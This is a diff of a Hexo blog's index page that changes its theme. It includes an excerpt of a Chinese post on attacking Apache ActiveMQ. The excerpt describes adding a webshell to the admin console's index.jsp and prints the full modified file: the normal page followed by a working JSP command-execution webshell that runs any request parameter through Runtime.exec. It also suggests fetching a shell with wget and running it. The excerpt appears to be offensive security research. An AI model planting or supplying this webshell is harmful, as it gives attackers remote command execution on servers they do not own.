@@ -1,452 +1,284 @@
-<!DOCTYPE html>
-<html lang=en>
+<!DOCTYPE HTML>
+<html>
 <head>
   <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
   
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
-  <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-transform" />
-  <meta http-equiv="Cache-Control" content="no-siteapp" />
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-  <meta name="format-detection" content="telephone=no,email=no,adress=no">
-  <!-- Color theme for statusbar -->
-  <meta name="theme-color" content="#000000" />
-  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
-  <meta http-equiv="window-target" content="_top" />
+  <title>MyStie</title>
+  <meta name="author" content="Hello">
   
   
-  <title>Hexo</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/index.html">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png" type="image/x-icon">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
+  <meta property="og:site_name" content="MyStie"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="MyStie" type="application/atom+xml">
   
   
+    <link href="/favicon.png" rel="icon">
   
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
 <meta name="generator" content="Hexo 6.3.0"></head>
 
-
-<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
-  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-  <div class="slimContent">
-    <div class="navbar-header">
-      
-      
-      <div class="profile-block text-center">
-        <a id="avatar" href="http://www.baidu.com" target="_blank">
-          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
-        </a>
-        <h2 id="name" class="hidden-xs hidden-sm">没有名字</h2>
-        <h3 id="title" class="hidden-xs hidden-sm hidden-md">我的小博客</h3>
-        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
-      </div>
-      
-      <div class="search" id="search-form-wrap">
-
-    <form class="search-form sidebar-form">
-        <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="Search" />
-            <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
-            </span>
-        </div>
-    </form>
-    <div class="ins-search">
-  <div class="ins-search-mask"></div>
-  <div class="ins-search-container">
-    <div class="ins-input-wrapper">
-      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
-      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-    </div>
-    <div class="ins-section-wrapper">
-      <div class="ins-section-container"></div>
-    </div>
-  </div>
-</div>
-
-
-</div>
-      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
-        <span class="sr-only">Toggle navigation</span>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-    </div>
-    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
-      <ul class="nav navbar-nav main-nav ">
-        
-        
-        <li class="menu-item menu-item-home">
-          <a href="/.">
-            
-            <i class="icon icon-home-fill"></i>
-            
-            <span class="menu-title">Home</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives">
-            
-            <i class="icon icon-archives-fill"></i>
-            
-            <span class="menu-title">Archives</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories">
-            
-            <i class="icon icon-folder"></i>
-            
-            <span class="menu-title">Categories</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags">
-            
-            <i class="icon icon-tags"></i>
-            
-            <span class="menu-title">Tags</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-repository">
-          <a href="/repository">
-            
-            <i class="icon icon-project"></i>
-            
-            <span class="menu-title">Repository</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-books">
-          <a href="/books">
-            
-            <i class="icon icon-book-fill"></i>
-            
-            <span class="menu-title">Books</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-links">
-          <a href="/links">
-            
-            <i class="icon icon-friendship"></i>
-            
-            <span class="menu-title">Links</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about">
-            
-            <i class="icon icon-cup-fill"></i>
-            
-            <span class="menu-title">About</span>
-          </a>
-        </li>
-        
-      </ul>
-      
-	
-    <ul class="social-links">
-    	
-        <li><a href="http://www.baidu.com" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
-        
-        <li><a href="http://www.baidu.com" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
-        
-        <li><a href="http://www.baidu.com" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
-        
-        <li><a href="http://www.baidu.com" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
-        
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
-        
-    </ul>
+	  <a class="navbar-brand" href="/">MyStie</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
 
-    </nav>
-  </div>
-</header>
-
-  
-    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
-  <div class="slimContent">
-    
-      <div class="widget">
-    <h3 class="widget-title">Board</h3>
-    <div class="widget-body">
-        <div id="board">
-            <div class="content">
-                <p>欢迎交流与分享经验!</p>
-            </div>
-        </div>
-    </div>
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>MyStie<span class="blink-fast">|</span></h1>
 </div>
 
-    
-      
+<div class="row page">
 
-    
-      
+	
+	<div class="col-md-9">
+	
 
-    
-      
-    
-      
-  <div class="widget">
-    <h3 class="widget-title">Archive</h3>
-    <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">2</span></li></ul>
-    </div>
-  </div>
+		<div class="slogan">
 
 
-    
-      
-  <div class="widget">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget-body">
-      <ul class="recent-post-list list-unstyled no-thumbnail">
-        
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                
-              </p>
-              <p class="item-title">
-                <a href="/2023/11/02/activeMQAttack/" class="title">ActiveMQ漏洞研究</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2023-11-02T04:57:41.309Z" itemprop="datePublished">2023-11-02</time>
-              </p>
-            </div>
-          </li>
-          
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                
-              </p>
-              <p class="item-title">
-                <a href="/2023/10/20/test-my-site/" class="title">test_my_site</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2023-10-20T06:14:23.000Z" itemprop="datePublished">2023-10-20</time>
-              </p>
-            </div>
-          </li>
-          
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                
-              </p>
-              <p class="item-title">
-                <a href="/2023/10/20/hello-world/" class="title">Hello World</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2023-10-20T06:13:29.724Z" itemprop="datePublished">2023-10-20</time>
-              </p>
-            </div>
-          </li>
-          
-      </ul>
-    </div>
-  </div>
-  
+		<i class="fa fa-heart blink-slow"></i>
 
-    
-  </div>
-</aside>
+		wubba lubba dub dub.
 
-  
-  <main class="main" role="main">
-  
-  <div class="content article-list">
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/02/activeMQAttack/">ActiveMQ漏洞研究</a>
-    </h1>
-  
+</div>    
 
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/02/activeMQAttack/" class="article-date">
-	  <time datetime="2023-11-02T04:57:41.309Z" itemprop="datePublished">Nov 2</time>
-	</a>
-</span>
-    
-    
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/11/02/activeMQAttack/" >ActiveMQ漏洞研究</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-11-02  </div>
+		</div>
+	</div>
+	
 
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/02/activeMQAttack/#comments" class="article-comment-link">Comments</a></span>
-    
-  </p>
-</article>
 
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/10/20/test-my-site/">test_my_site</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/10/20/test-my-site/" class="article-date">
-	  <time datetime="2023-10-20T06:14:23.000Z" itemprop="datePublished">Oct 20</time>
-	</a>
-</span>
-    
-    
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/10/20/test-my-site/#comments" class="article-comment-link">Comments</a></span>
-    
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/10/20/hello-world/">Hello World</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/10/20/hello-world/" class="article-date">
-	  <time datetime="2023-10-20T06:13:29.724Z" itemprop="datePublished">Oct 20</time>
-	</a>
-</span>
-    
-    
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/10/20/hello-world/#comments" class="article-comment-link">Comments</a></span>
-    
-  </p>
-</article>
-
-    
-  </div>
-
-   
-</main>
-
-  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+			<div class="entry">
+  <div class="row">
 	
 	
-    <ul class="social-links">
-    	
-        <li><a href="http://www.baidu.com" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
-        
-        <li><a href="http://www.baidu.com" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
-        
-        <li><a href="http://www.baidu.com" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
-        
-        <li><a href="http://www.baidu.com" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
-        
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
-        
-    </ul>
+		<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><h3 id="深度利用"><a href="#深度利用" class="headerlink" title="深度利用"></a>深度利用</h3><h4 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h4><blockquote>
+<p>默认情况下，ActiveMQ 仅在 admin 和 api 目录具有写入权限，且访问 admin 或者 api 均需要登录。此时若无法爆破出密码，直接利用ActiveMQ写shell就很难实现。但是存在一种情况是，ActiveMQ具有足够权限的时候，可以将 admin 下的 index .jsp 进行修改，在其后面添加 webshell（如下所示：上半部分是正常的index.jsp，后面则是被添加的webshell），此时正常访问ActiveMQ的admin目录即可获取webshell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">    Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">    contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">    this work <span class="keyword">for</span> additional information regarding copyright ownership.</span><br><span class="line">    The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">    (the <span class="string">&quot;License&quot;</span>); you may not use this file except <span class="keyword">in</span> compliance with</span><br><span class="line">    the License.  You may obtain a copy of the License at</span><br><span class="line">   </span><br><span class="line">    http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">   </span><br><span class="line">    Unless required by applicable law or agreed to <span class="keyword">in</span> writing, software</span><br><span class="line">    distributed under the License is distributed on an <span class="string">&quot;AS IS&quot;</span> BASIS,</span><br><span class="line">    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">    See the License <span class="keyword">for</span> the specific language governing permissions and</span><br><span class="line">    limitations under the License.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;c:<span class="built_in">set</span> var=<span class="string">&quot;pageTitle&quot;</span> value=<span class="string">&quot;ActiveMQ Console&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@include file=<span class="string">&quot;decorators/head.jsp&quot;</span> %&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@include file=<span class="string">&quot;decorators/header.jsp&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;Welcome!&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;</span><br><span class="line">Welcome to the Apache ActiveMQ Console of &lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerName&#125;</span>&quot;</span> /&gt;&lt;/b&gt; (&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.brokerId&#125;</span>&quot;</span> /&gt;)</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;</span><br><span class="line">You can find more information about Apache ActiveMQ on the &lt;a href=<span class="string">&quot;&lt;c:url value=&quot;</span>http://activemq.apache.org/<span class="string">&quot; /&gt;&quot;</span>&gt;Apache ActiveMQ Site&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;Broker&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td&gt;Name&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.brokerName&#125;</span>&quot;</span> /&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td&gt;Version&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.brokerVersion&#125;</span>&quot;</span> /&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td&gt;ID&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.brokerId&#125;</span>&quot;</span> /&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td&gt;Uptime&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.uptime&#125;</span>&quot;</span> /&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td&gt;Store percent used&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.storePercentUsage&#125;</span>&quot;</span> /&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td&gt;Memory percent used&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.memoryPercentUsage&#125;</span>&quot;</span> /&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">        &lt;td&gt;Temp percent used&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;b&gt;&lt;c:out value=<span class="string">&quot;<span class="variable">$&#123;requestContext.brokerQuery.brokerAdmin.tempPercentUsage&#125;</span>&quot;</span> /&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;%@include file=<span class="string">&quot;decorators/footer.jsp&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page import=<span class="string">&quot;java.util.*,java.io.*,java.net.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">//</span><br><span class="line">// JSP_KIT</span><br><span class="line">//</span><br><span class="line">// cmd.jsp = Command Execution (win32)</span><br><span class="line">//</span><br><span class="line">// by: Unknown</span><br><span class="line">// modified: 27/06/2003</span><br><span class="line">//</span><br><span class="line">%&gt;</span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">&quot;POST&quot;</span> NAME=<span class="string">&quot;myform&quot;</span> ACTION=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">&quot;text&quot;</span> NAME=<span class="string">&quot;cmd&quot;</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">&quot;submit&quot;</span> VALUE=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != null) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;\n&lt;BR&gt;&quot;</span>);</span><br><span class="line">        Process p = Runtime.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        OutputStream os = p.getOutputStream();</span><br><span class="line">        InputStream <span class="keyword">in</span> = p.getInputStream();</span><br><span class="line">        DataInputStream dis = new DataInputStream(<span class="keyword">in</span>);</span><br><span class="line">        String disr = dis.readLine();</span><br><span class="line">        <span class="keyword">while</span> ( disr != null ) &#123;</span><br><span class="line">                out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-    <div class="copyright">
-    	
-        <div class="publishby">
-        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
-        </div>
-    </div>
-</footer>
-  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
-<script>
-window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
-</script>
+<p><img src="https://raw.githubusercontent.com/kkll5875/blog_images/main/image-20231102135523989.png" alt="image-20231102135523989"></p>
+<h4 id="直接上线"><a href="#直接上线" class="headerlink" title="直接上线"></a>直接上线</h4><blockquote>
+<p> 由于在互联网测，要想利用漏洞则必须是服务器可出网的情况下，那么也可以考虑直接进行上线，先利用 wget 下载 shell，然后逐步赋权运行。</p>
+</blockquote>
 
-<script src="/js/plugin.min.js"></script>
+	
+	</div>
+  <a type="button" href="/2023/11/02/activeMQAttack/#more" class="btn btn-default more">Read More</a>
+</div>
 
+		
 
-<script src="/js/application.js"></script>
+		</div>
 
-
-    <script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: 'Posts',
-            PAGES: 'Pages',
-            CATEGORIES: 'Categories',
-            TAGS: 'Tags',
-            UNTITLED: '(Untitled)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '/content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-
-<script src="/js/insight.js"></script>
-
-
-
-
-
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
 
    
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/11/02/activeMQAttack/" ><i class="fa fa-file-o"></i>ActiveMQ漏洞研究</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Hello's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
 
 
 
-
-
-
-
-
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
 
 </body>
-</html>
+   </html>
